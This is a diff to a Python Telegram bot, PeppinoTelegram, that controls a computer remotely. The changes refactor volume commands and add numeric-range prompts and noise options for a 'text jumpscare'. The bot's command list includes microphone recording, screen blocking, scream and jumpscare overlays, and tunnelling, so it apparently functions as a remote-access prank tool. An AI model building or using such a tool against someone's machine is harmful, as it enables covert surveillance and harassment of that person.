@@ -103,7 +103,6 @@ TELEGRAM_COMMANDS_LIMIT = 100
 TELEGRAM_COMMAND_LENGHT_LIMIT = 32
 TELEGRAM_COMMAND_DESCRIPTION_LENGHT_LIMIT = 256
 KEY_PATH = resource_path("key.key")
-GENERATE_COMMANDS_MD = False
 
 try:
     vfx = resource_path(join("assets", "vfx"))
@@ -557,10 +556,10 @@ class PeppinoTelegram:
 
             # 🔊 Audio & Volume
             Command("microphone", self.send_record_audio, "Record microphone audio.", "audio", "🎙️ Microphone"),
-            Command("mutevolume", lambda: self.audio_mixer.mute(), "Mute system volume.", "audio", "🔇 Mute Volume"),
-            Command("fullvolume", lambda: self.audio_mixer.full(), "Set volume to maximum.", "audio", "🔊 Full Volume"),
-            Command("setvolume", self.audio_mixer.setVolumePercentage, "Set volume percentage.", "audio", "🎚️ Set Volume"),
-            Command("getvolume", lambda: self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"), "Get current volume.", "audio", "📊 Get Volume"),
+            Command("mutevolume", self.mute_audio, "Mute system volume.", "audio", "🔇 Mute Volume"),
+            Command("fullvolume", self.full_audio, "Set volume to maximum.", "audio", "🔊 Full Volume"),
+            Command("setvolume", self.set_volume, "Set volume percentage.", "audio", "🎚️ Set Volume"),
+            Command("getvolume", self.get_volume, "Get current volume.", "audio", "📊 Get Volume"),
             Command("mixermenu", self.mixer_menu, "Open audio mixer menu.", "audio", "🎛️ Mixer Menu"),
             Command("playfromurl", self.audio_player.play_from_url, "Play audio from URL.", "audio", "🔗 Play from URL"),
             Command("playrandomnoise", self.playrandomnoise, "Play static/interference noise.", "audio", "📡 Play Noise"),
@@ -597,7 +596,7 @@ class PeppinoTelegram:
             Command("whisper_overlay", self.whisper_overlay, "Display creepy whisper overlay.", "pranks", "👻 Red Text Overlay"),
             Command("set_jumpscare_volume", self.setJumpscareVolume, "Adjust jumpscare volume.","pranks" , "🔊 Jumpscare Volume"),
             Command("block_screen", self.wrapper_block_screen, "Block user screen temporarily forcing them to see a screenshot.", "pranks", "🖥️ Block Screen"), #TODO
-            Command("text_jumpscare", self.overlay_tk.textual_jumpscare, "Textual Jumpscare", "pranks", "Text Jumpscare"),
+            Command("text_jumpscare", self.textual_jumpscare, "Textual Jumpscare", "pranks", "Text Jumpscare"),
 
             # 🦑 Misc & Memes
             Command("plankton", self.plankton, "Plankton jumpscare.", "misc", "🦑 Plankton"),
@@ -697,15 +696,51 @@ class PeppinoTelegram:
         LOADING_STATUS_MESSAGE.edit("🚀 READY")
         LOADING_STATUS_MESSAGE.delete()
 
+    def mute_audio(self) -> None:
+        self.audio_mixer.mute()
+        self.bsendWithHtml(
+            "<b>🔇 Muted</b>\n"
+            "<code>Volume → 0%</code>"
+        )
+
+    def full_audio(self) -> None:
+        self.audio_mixer.full()
+        self.bsendWithHtml(
+            "<b>🔊 Full Volume</b>\n"
+            "<code>Volume → 100%</code> <i>max power</i>"
+        )
+
+    def get_volume(self) -> None:
+        vol = self.audio_mixer.getVolumePercentage()
+        bar = "▰" * (vol // 10) + "▱" * (10 - (vol // 10))
+        emoji = "🔇" if vol <= 20 else "🔉" if vol <= 60 else "🔊"
+        
+        self.bsendWithHtml(
+            f"<b>{emoji} Current Volume</b>\n"
+            f"<code>{bar}  {vol}%</code>"
+        )
+
+    def set_volume(self, custom_text:str|None=None) -> None:
+        vol = self.send_prompt_inrange(
+        "<b>🔊 Set volume level:</b>\n<code>Enter value (0–100): </code>" if not custom_text else custom_text,
+        min=0, max=100)
+        if not vol:return
+        if vol:
+            self._audio_mixer_set_volume(vol)
+
+    def _audio_mixer_set_volume(self, volume):
+        print(f"Setting volume to {volume}")
+        self.bsendWithHtml(f"🔊 {volume}%")
+        self.audio_mixer.setVolumePercentage(volume)
+
     def __play_loaded_sound(self, audio: str, volume=None) -> None:
         print(f"Playing loaded sound: {audio}, volume={volume}")
         old = self.audio_mixer.getVolumePercentage()
         if volume:
-            self.set_volume(volume)
+            self._audio_mixer_set_volume(volume)
         self.audio_player.play_wav(self.audios[audio])
         if volume:
-            self.set_volume(old)
-
+            self._audio_mixer_set_volume(old)
 
     def __send_image(self, image_name: str | None = None, image_buf: io.BytesIO = None, caption=None) -> int:
         print(f"Sending image: {image_name}, caption={caption}")
@@ -2287,12 +2322,12 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print("Playing 15-second scream")
         self.__play_loaded_sound("scream_15s")
 
-    def playrandomnoise(self, duration: int) -> None:
+    def playrandomnoise(self, duration: int, volume: int=0.3) -> None:
         print(f"Playing random noise for {duration} seconds")
         start = monotonic()
         loading_bar = self.new_loading_bar(duration, label="📡 Play Random Noise")
         if not loading_bar: return
-        thread = Thread(target=self.audio_player.play_random_noise, args=(duration,))
+        thread = Thread(target=self.audio_player.play_random_noise, args=(duration,44100,volume))
         thread.start()
         while (monotonic()-start) < duration:
             elapsed = int(monotonic()-start)
@@ -2746,13 +2781,6 @@ The bot is now restarting. Please wait a moment...
         loading_bar.delete()
         self.restore_wallpaper()
 
-    def set_volume(self, volume):
-        print(f"Setting volume to {volume}")
-        if volume in range(0, 101):
-            self.audio_mixer.setVolumePercentage(volume)
-        else:
-            self.bsend(f"Volume must be from 0.0 to 100.0")
-
     def setvideowallpaper(self, videofilename: str) -> None:
         print(f"Setting video as wallpaper: {videofilename}")
         if not self.confirmContuinuingWithoutWallpaperBackup():
@@ -2966,6 +2994,22 @@ The bot is now restarting. Please wait a moment...
                 self.delete_message(msgid)
             return tmp
 
+    def send_prompt_numeric(self, question: str, timeout: int = 30, delete: bool = False) -> float|None:
+        val = self.send_prompt(question=question, timeout=timeout, delete=delete)
+        if is_number(val):
+            return float(val)
+        else:
+            self.operation_canceled("That's not a valid numeric value.")
+            return
+
+    def send_prompt_inrange(self, question: str, min: int, max: int, timeout: int = 30, delete: bool = False) -> float|None:
+        val = self.send_prompt_numeric(question=question, timeout=timeout, delete=delete)
+        if not val: return
+        if val>=min and val<=max:
+            return val
+        else:
+            self.operation_canceled(f"The number you've sent is not in the range ({min}-{max})")
+
     def send_buttons_input(self, options: dict[str, str], title: str = "Choose an option", timeout: int = 30, rows: int = 2) -> str | None:
         """
         Sends an inline menu and waits for user to click one button.
@@ -3154,6 +3198,21 @@ The bot is now restarting. Please wait a moment...
     def test(self) -> None: #this is a test command used for test purpuses, can be used with /test
         print("Running test")
 
+    def textual_jumpscare(self, text: str, duration: int) -> None:
+        add_noise = self.ask_yesno("Add disturbance noise overlay?")
+
+        if add_noise:
+            self.set_volume(custom_text="Set noise volume (0–100):")
+            Thread(
+                target=self.playrandomnoise,
+                args=(duration,),
+                daemon=True
+            ).start()
+        self.overlay_tk.textual_jumpscare(
+            text=text,
+            duration=duration,
+        )
+
     def update_commands(self) -> bool:
         print("Updating commands")
         commands = self.extract_commands()
@@ -3302,14 +3361,5 @@ if __name__ == "__main__":
             signal_error += f"Unhandled exception: {e}\n"
 
     pep2 = PeppinoTelegram(token,chat_id,ngrok_token,capture,loading_bar_set=[emoji_dict["progress"],emoji_dict["empty_progress"]],loading_bar_spinner=all_spinners["circle_dots"], tunnel_provider="ngrok" if ngrok_token and tunnel_provider=="ngrok" else "localtunnel", logger=logger)
-
-    # Use only if developer
-    if GENERATE_COMMANDS_MD:
-        try:
-            import generate_commandsMD
-            generate_commandsMD.main(pep2)
-        except ImportError:
-            pass
-        sys.exit(0)
     # I wanted to make this multiple user but the code has become too hard to maintain.
     pep2.start()
